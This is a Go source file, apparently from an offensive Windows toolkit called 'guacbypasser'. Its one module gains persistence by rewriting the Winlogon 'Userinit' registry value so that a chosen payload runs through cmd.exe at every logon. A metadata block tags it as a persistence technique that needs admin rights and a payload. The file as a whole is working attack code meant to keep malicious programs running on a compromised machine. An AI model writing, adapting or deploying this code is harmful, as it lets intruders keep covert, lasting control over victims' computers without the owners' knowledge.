package guacbypasser

import (
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// C:\Windows\system32\userinit.exe,
func pUserinit(path string) error {
	_ = Reporter{
		Name: "Userinit",
		Desc: "Gain persistence using Userinit registry key",
		Id:   11,

		Type:   "Persistence",
		Module: "p_userinit",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	wk32, err := registry.OpenKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}
	if err := wk32.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), cmdN)); err != nil {
		return err
	}
	return nil
}
